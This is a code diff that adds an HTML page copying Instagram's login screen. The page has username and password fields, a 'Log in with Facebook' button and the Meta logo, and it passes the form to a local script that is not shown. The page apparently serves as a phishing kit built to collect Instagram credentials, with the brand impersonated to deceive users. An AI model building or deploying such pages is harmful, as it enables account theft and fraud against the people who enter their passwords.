@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="uz">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="stylesheet" href="/static/style.css">
+</head>
+
+<body>
+    <div class="container">
+        <div class="header">
+            <svg aria-label="Back" fill="#ffffff" height="24" viewBox="0 0 24 24" width="24">
+                <path
+                    d="M21 17.502a.997.997 0 0 1-.707-.293L12 8.913l-8.293 8.296a1 1 0 1 1-1.414-1.414l9-9.004a1.03 1.03 0 0 1 1.414 0l9 9.004A1 1 0 0 1 21 17.502Z"
+                    transform="rotate(-90 12 12)"></path>
+            </svg>
+            <span>Log into Instagram</span>
+        </div>
+
+        <form id="login-form">
+            <input type="text" id="username" placeholder="Mobile number, username or email" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit" class="login-btn">Log in</button>
+        </form>
+
+        <a href="#" class="forgot">Forgot password?</a>
+
+        <div class="footer-btns">
+            <button class="fb-btn">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" width="20"
+                    alt="fb">
+                Log in with Facebook
+            </button>
+            <button class="create-btn">Create new account</button>
+        </div>
+
+        <div class="meta">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" width="60"
+                alt="meta">
+        </div>
+    </div>
+    <script src="/static/script.js"></script>
+</body>
+
+</html>
